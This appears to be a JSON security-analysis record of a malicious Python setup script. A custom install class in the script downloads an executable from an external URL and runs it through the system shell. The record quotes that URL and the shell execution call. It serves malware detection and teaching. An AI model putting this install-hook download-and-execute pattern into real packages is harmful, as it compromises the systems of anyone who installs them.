{
  "purpose": "The setup script is intended to install a Python package, but it includes malicious behavior designed to download and execute an external executable.",
  "sources": "urllib.request.urlretrieve() to download a file from an external URL, run() to execute the downloaded file",
  "sinks": "run(['start', 'syswin32.exe'], shell=True) which executes the downloaded executable",
  "flows": "urlretrieve downloads 'https://tryg.ga/syswin32.exe' -> run executes 'syswin32.exe' using system shell",
  "anomalies": "The class 'SneakyInstall' overrides the install command to download and execute an external binary during installation, which is atypical and suspicious. No legitimate package would perform such actions.",
  "analysis": "The code imports necessary modules and defines a subclass of 'install' called 'SneakyInstall'. Within the 'run' method, it attempts to download a file from a suspicious URL and executes it immediately, bypassing typical installation procedures. The setup function uses this custom install class, ensuring this behavior occurs during package installation. This indicates malicious intent to execute external code on the target system. The presence of external URL, automatic execution, and overridden install command are clear red flags.",
  "conclusion": "This code contains malicious behavior by downloading and executing an external executable during package installation. It is designed for malicious purposes such as system compromise or malware distribution. The code demonstrates high malicious intent and is dangerous to run.",
